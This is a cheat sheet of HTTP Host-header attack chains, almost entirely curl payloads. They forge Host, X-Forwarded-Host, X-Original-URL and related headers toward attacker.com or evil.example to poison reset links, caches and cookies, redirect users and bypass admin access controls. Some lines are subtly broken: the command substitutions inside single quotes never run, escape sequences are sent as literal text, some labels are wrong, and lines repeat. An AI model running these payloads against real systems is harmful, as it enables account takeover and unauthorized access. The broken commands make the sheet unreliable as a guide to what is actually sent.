# Multi-step chains — every host-header chain, exhaustively

The chain map — a shape, a chain, a proof.

---

## 1. canonical-URL chain — a stored injection

```text
a canonical-URL chain — a reflected host → the app's links/scripts point to
attacker.com → a stored injection — a canonical-URL sink.
```

```bash
curl -s -D - -H 'Host: canary.example' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -H 'Host: canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -D - -H 'Host: canary.example' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/callback" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/verify" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/confirm" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
curl -s -D - -H 'Host: canary.example' "$BASE/api/internal" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/api/admin" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/api/user" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/api/debug" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/api/preview" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/api/private" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/api/internal" | grep -i 'location\|set-cookie'
```

## 2. reset-link chain — an account takeover

```text
a reset-link chain — a reflected forwarded header → the reset link points to
attacker.com → the victim's reset token stolen → an account takeover — a
reset-link sink.
```

```bash
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Host: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Server: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-HTTP-Host-Override: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Forwarded: host=canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-Email: admin@target.com' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'X-Forwarded-User: admin' "$BASE/reset" | grep -i 'location\|set-cookie'
```

## 3. Location chain — an open redirect

```text
a Location chain — a reflected host → the Location points to attacker.com →
an open redirect — a Location sink.
```

```bash
curl -s -D - -H 'Host: canary.example' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'X-Host: canary.example' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'Forwarded: host=canary.example' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/callback" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/verify" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/confirm" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/api/internal" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/api/admin" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/api/user" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/api/debug" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/api/preview" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/api/private" | grep -i 'location'
```

## 4. Set-Cookie chain — a session fixation

```text
a Set-Cookie chain — a reflected host → the cookie domain binds to attacker.com
→ a session fixation — a Set-Cookie sink.
```

```bash
curl -s -D - -H 'Host: canary.example' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Host: canary.example' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'Forwarded: host=canary.example' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Forwarded-Proto: http' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Forwarded-Proto: https' "$BASE/login" | grep -i 'set-cookie'
```

## 5. cache-key chain — a cache-poisoning feed

```text
a cache-key chain — a reflected host → the cache stores the page under
attacker.com → a cache-poisoning feed — a cache-key sink.
```

```bash
curl -s -D - -H 'Host: canary.example' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
curl -s -D - -H 'X-Host: canary.example' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
curl -s -D - -H 'Forwarded: host=canary.example' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
curl -s -D - -H 'X-Forwarded-Proto: http' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
curl -s -D - -H 'X-Forwarded-Proto: https' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
curl -s -D - -H 'X-Forwarded-Scheme: http' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
curl -s -D - -H 'X-Forwarded-Scheme: https' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
```

## 6. rewrite chain — an ACL bypass

```text
a rewrite chain — a middleware rewrite → a rewritten path reaches a gated
route → an ACL bypass — a rewrite sink.
```

```bash
curl -i "$BASE/admin"                        # expect 403
curl -i -H 'X-Original-URL: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Rewrite-URL: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Forwarded-Path: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Forwarded-Prefix: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Original-Path: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Real-Path: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Original-URL: /internal' "$BASE/" # 200 with the internal body = finding
curl -i -H 'X-Original-URL: /private' "$BASE/" # 200 with the private body = finding
curl -i -H 'X-Original-URL: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i -H 'X-Original-URL: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i -H 'X-Original-URL: /api/private' "$BASE/" # 200 with the api private body = finding
curl -i -H 'X-Original-URL: /api/user' "$BASE/" # 200 with the api user body = finding
curl -i -H 'X-Original-URL: /api/debug' "$BASE/" # 200 with the api debug body = finding
curl -i -H 'X-Original-URL: /api/preview' "$BASE/" # 200 with the api preview body = finding
curl -i -H 'X-Rewrite-URL: /internal' "$BASE/" # 200 with the internal body = finding
curl -i -H 'X-Rewrite-URL: /private' "$BASE/" # 200 with the private body = finding
curl -i -H 'X-Rewrite-URL: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i -H 'X-Rewrite-URL: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i -H 'X-Rewrite-URL: /api/private' "$BASE/" # 200 with the api private body = finding
curl -i -H 'X-Rewrite-URL: /api/user' "$BASE/" # 200 with the api user body = finding
curl -i -H 'X-Rewrite-URL: /api/debug' "$BASE/" # 200 with the api debug body = finding
curl -i -H 'X-Rewrite-URL: /api/preview' "$BASE/" # 200 with the api preview body = finding
curl -i -H 'X-Original-Path: /internal' "$BASE/" # 200 with the internal body = finding
curl -i -H 'X-Original-Path: /private' "$BASE/" # 200 with the private body = finding
curl -i -H 'X-Original-Path: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i -H 'X-Original-Path: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i -H 'X-Original-Path: /api/private' "$BASE/" # 200 with the api private body = finding
curl -i -H 'X-Real-Path: /internal' "$BASE/" # 200 with the internal body = finding
curl -i -H 'X-Real-Path: /private' "$BASE/" # 200 with the private body = finding
curl -i -H 'X-Real-Path: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i -H 'X-Real-Path: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i -H 'X-Real-Path: /api/private' "$BASE/" # 200 with the api private body = finding
```

## 7. forwarded chain — a stored injection

```text
a forwarded chain — a reflected forwarded header → the app's links point to
attacker.com → a stored injection — a forwarded sink.
```

```bash
curl -s -H 'Forwarded: host=canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example;proto=http' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: host=canary.example;for=127.0.0.1' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: host=canary.example;proto=http' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example;proto=https' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: for=::1;host=canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: for=10.0.0.1;host=canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -H 'Forwarded: host=canary.example' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -H 'Forwarded: host=canary.example' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example;proto=http' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -H 'Forwarded: for=127.0.0.1;host=canary.example;proto=http' "$BASE/sitemap.xml" | grep -i 'location\|set-cookie'
```

## 8. duplicated Host chain — a parsing differential

```text
a duplicated Host chain — the proxy reads the first; the app reads the second
→ a parsing differential.
```

```bash
curl -s -D - -H 'Host: good.example' -H 'Host: evil.example' "$BASE/"
curl -s -D - -H 'Host: evil.example' -H 'Host: good.example' "$BASE/"
curl -s -D - -H 'Host: good.example' -H 'Host: target.com' "$BASE/"
curl -s -D - -H 'Host: target.com' -H 'Host: good.example' "$BASE/"
curl -s -D - -H 'Host: good.example' -H 'Host: internal' "$BASE/"
curl -s -D - -H 'Host: internal' -H 'Host: good.example' "$BASE/"
curl -s -D - -H 'Host: good.example' -H 'Host: localhost' "$BASE/"
curl -s -D - -H 'Host: localhost' -H 'Host: good.example' "$BASE/"
curl -s -D - -H 'Host: good.example' -H 'Host: 127.0.0.1' "$BASE/"
curl -s -D - -H 'Host: 127.0.0.1' -H 'Host: good.example' "$BASE/"
```

## 9. malformed Host chain — a parsing edge

```text
a malformed Host chain — a parsing edge → a differential.
```

```bash
curl -s -D - -H 'Host: evil.example:80' "$BASE/"   # a forged port — a parsing edge
curl -s -D - -H 'Host: evil.example:443' "$BASE/"   # a forged port — a parsing edge
curl -s -D - -H 'Host: evil.example:8080' "$BASE/"   # a forged port — a parsing edge
curl -s -D - -H 'Host: evil.example:0' "$BASE/"   # a forged port — a parsing edge
curl -s -D - -H 'Host: evil.example:65535' "$BASE/"   # a forged port — a parsing edge
curl -s -D - -H 'Host: evil.example.' "$BASE/"   # a trailing dot — a parsing edge
curl -s -D - -H 'Host: target.com.' "$BASE/"   # a trailing dot — a parsing edge
curl -s -D - -H 'Host: internal.' "$BASE/"   # a trailing dot — a parsing edge
curl -s -D - -H 'Host: localhost.' "$BASE/"   # a trailing dot — a parsing edge
curl -s -D - -H 'Host: evil.example..target.com' "$BASE/"   # a double-dot — a parsing edge
curl -s -D - -H 'Host: evil.example..internal' "$BASE/"   # a double-dot — a parsing edge
curl -s -D - -H 'Host: evil.example..evil.example' "$BASE/"   # a double-dot — a parsing edge
curl -s -D - -H 'Host: ..target.com' "$BASE/"   # a double-dot — a parsing edge
curl -s -D - -H 'Host: ' "$BASE/"   # an empty host — a parsing edge
curl -s -D - -H 'Host:  ' "$BASE/"   # a whitespace host — a parsing edge
curl -s -D - -H 'Host: \t' "$BASE/"   # a tab host — a parsing edge
curl -s -D - -H 'Host: \n' "$BASE/"   # a newline host — a parsing edge
curl -s -D - -H 'Host: \r' "$BASE/"   # a carriage-return host — a parsing edge
curl -s -D - -H 'Host: \0' "$BASE/"   # a null-byte host — a parsing edge
curl -s -D - -H 'Host: évil.example' "$BASE/"   # a Unicode host — a parsing edge
curl -s -D - -H 'Host: evi\u006c.example' "$BASE/"   # a Unicode host — a parsing edge
curl -s -D - -H 'Host: evi%6c.example' "$BASE/"   # a Unicode host — a parsing edge
curl -s -D - -H 'Host: xn--vil-1na.example' "$BASE/"   # a punycode host — a parsing edge
curl -s -D - -H 'Host: xn--vil-1na' "$BASE/"   # a punycode host — a parsing edge
curl -s -D - -H 'Host: 127.0.0.1' "$BASE/"   # an IPv4 host — a parsing edge
curl -s -D - -H 'Host: 0.0.0.0' "$BASE/"   # an IPv4 host — a parsing edge
curl -s -D - -H 'Host: 255.255.255.255' "$BASE/"   # an IPv4 host — a parsing edge
curl -s -D - -H 'Host: 10.0.0.1' "$BASE/"   # an IPv4 host — a parsing edge
curl -s -D - -H 'Host: 192.168.1.1' "$BASE/"   # an IPv4 host — a parsing edge
curl -s -D - -H 'Host: 172.16.0.1' "$BASE/"   # an IPv4 host — a parsing edge
curl -s -D - -H 'Host: [::1]' "$BASE/"   # an IPv6 host — a parsing edge
curl -s -D - -H 'Host: [::ffff:127.0.0.1]' "$BASE/"   # an IPv6 host — a parsing edge
curl -s -D - -H 'Host: [2001:db8::1]' "$BASE/"   # an IPv6 host — a parsing edge
curl -s -D - -H 'Host: [fe80::1]' "$BASE/"   # an IPv6 host — a parsing edge
curl -s -D - -H 'Host: evil.example@target.com' "$BASE/"   # an @-separator — a parsing edge
curl -s -D - -H 'Host: target.com@evil.example' "$BASE/"   # an @-separator — a parsing edge
curl -s -D - -H 'Host: evil.example@internal' "$BASE/"   # an @-separator — a parsing edge
curl -s -D - -H 'Host: internal@evil.example' "$BASE/"   # an @-separator — a parsing edge
curl -s -D - -H 'Host: evil.example#target.com' "$BASE/"   # a #-separator — a parsing edge
curl -s -D - -H 'Host: target.com#evil.example' "$BASE/"   # a #-separator — a parsing edge
curl -s -D - -H 'Host: evil.example#internal' "$BASE/"   # a #-separator — a parsing edge
curl -s -D - -H 'Host: internal#evil.example' "$BASE/"   # a #-separator — a parsing edge
curl -s -D - -H 'Host: evil.example?target.com' "$BASE/"   # a ?-separator — a parsing edge
curl -s -D - -H 'Host: target.com?evil.example' "$BASE/"   # a ?-separator — a parsing edge
curl -s -D - -H 'Host: evil.example?internal' "$BASE/"   # a ?-separator — a parsing edge
curl -s -D - -H 'Host: internal?evil.example' "$BASE/"   # a ?-separator — a parsing edge
curl -s -D - -H 'Host: evil.example/target.com' "$BASE/"   # a path separator — a parsing edge
curl -s -D - -H 'Host: target.com/evil.example' "$BASE/"   # a path separator — a parsing edge
curl -s -D - -H 'Host: evil.example/internal' "$BASE/"   # a path separator — a parsing edge
curl -s -D - -H 'Host: internal/evil.example' "$BASE/"   # a path separator — a parsing edge
curl -s -D - -H 'Host: evil.example\\target.com' "$BASE/"   # a backslash separator — a parsing edge
curl -s -D - -H 'Host: target.com\\evil.example' "$BASE/"   # a backslash separator — a parsing edge
curl -s -D - -H 'Host: evil.example\\internal' "$BASE/"   # a backslash separator — a parsing edge
curl -s -D - -H 'Host: internal\\evil.example' "$BASE/"   # a backslash separator — a parsing edge
curl -s -D - -H 'Host: evil.example%2etarget.com' "$BASE/"   # an encoded separator — a parsing edge
curl -s -D - -H 'Host: target.com%2eevil.example' "$BASE/"   # an encoded separator — a parsing edge
curl -s -D - -H 'Host: evil.example%252etarget.com' "$BASE/"   # a doubly-encoded separator — a parsing edge
curl -s -D - -H 'Host: target.com%252eevil.example' "$BASE/"   # a doubly-encoded separator — a parsing edge
curl -s -D - -H 'Host: evil.example:target.com' "$BASE/"   # a colon separator — a parsing edge
curl -s -D - -H 'Host: target.com:evil.example' "$BASE/"   # a colon separator — a parsing edge
curl -s -D - -H 'Host: evil.example:internal' "$BASE/"   # a colon separator — a parsing edge
curl -s -D - -H 'Host: internal:evil.example' "$BASE/"   # a colon separator — a parsing edge
curl -s -D - -H 'Host: evil.example..target.com' "$BASE/"   # a double-dot — a parsing edge
curl -s -D - -H 'Host: evil.example...target.com' "$BASE/"   # a triple-dot — a parsing edge
curl -s -D - -H 'Host: evil.example....target.com' "$BASE/"   # a quadruple-dot — a parsing edge
curl -s -D - -H 'Host: $(python3 -c "print('a'*1000)")' "$BASE/"   # a long host — a parsing edge
curl -s -D - -H 'Host: $(python3 -c "print('a'*10000)")' "$BASE/"   # a long host — a parsing edge
curl -s -D - -H 'Host: $(python3 -c "print('a'*100000)")' "$BASE/"   # a long host — a parsing edge
```

## 10. absolute-URI chain — a request-line differential

```text
an absolute-URI chain — a request-line differential — the proxy reads the
Host header; the app reads the absolute-URI → a differential.
```

```bash
curl -s -D - "$BASE/" --request-target 'http://evil.example/'   # an absolute-URI
curl -s -D - "$BASE/" --request-target 'http://target.com/'   # an absolute-URI
curl -s -D - "$BASE/" --request-target 'http://internal/'   # an absolute-URI
curl -s -D - "$BASE/" --request-target 'http://localhost/'   # an absolute-URI
curl -s -D - "$BASE/" --request-target 'http://127.0.0.1/'   # an absolute-URI
curl -s -D - "$BASE/" --request-target 'http://0.0.0.0/'   # an absolute-URI
curl -s -D - "$BASE/" --request-target 'http://255.255.255.255/'   # an absolute-URI
curl -s -D - "$BASE/" --request-target 'http://[::1]/'   # an absolute-URI
curl -s -D - "$BASE/" --request-target 'http://[::ffff:127.0.0.1]/'   # an absolute-URI
```

## 11. multi-header chain — a combined injection

```text
a multi-header chain — a combined injection — a forged host + a forged flag —
a local + an internal check → a privileged route reached.
```

```bash
curl "$BASE/api/internal" -H 'Host: evil.example' -H 'X-Internal: true'   # a host + an internal
curl "$BASE/api/admin" -H 'Host: evil.example' -H 'X-Admin: true'   # a host + an admin
curl "$BASE/api/user" -H 'Host: evil.example' -H 'X-Forwarded-User: admin'   # a host + a user
curl "$BASE/api/debug" -H 'Host: evil.example' -H 'X-Debug: true'   # a host + a debug
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Proto: http'   # a host + a scheme
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Scheme: http'   # a host + a scheme
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Original-URL: /admin'   # a host + a path
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Path: /admin'   # a host + a path
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Prefix: /admin'   # a host + a prefix
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-Host: attacker.com'   # a host + a forwarded host
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-Proto: http'   # a host + a scheme
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-Scheme: http'   # a host + a scheme
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Original-URL: /admin'   # a host + a path
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-Path: /admin'   # a host + a path
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-Prefix: /admin'   # a host + a prefix
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-Email: admin@target.com'   # a host + an email
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-User: admin'   # a host + a user
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-Server: internal'   # a host + a server
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-Port: 8080'   # a host + a port
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-Path: /admin'   # a host + a path
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-Prefix: /admin'   # a host + a prefix
```

## 12. multi-proxy chain — a chained normalization

```text
a multi-proxy chain — a chained normalization boundary — a per-layer
differential.
```

```bash
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # the edge strips it; the origin doesn't
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # a chained normalization
curl "$BASE/page" -H 'X-Forwarded-Scheme: http'   # a chained normalization
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # a chained user differential
curl "$BASE/page" -H 'X-Forwarded-Email: admin@target.com'   # a chained email differential
curl "$BASE/page" -H 'X-Forwarded-Server: internal'   # a chained server differential
curl "$BASE/page" -H 'X-Forwarded-Port: 8080'   # a chained port differential
curl "$BASE/page" -H 'X-Forwarded-Path: /admin'   # a chained path differential
curl "$BASE/page" -H 'X-Forwarded-Prefix: /admin'   # a chained prefix differential
```
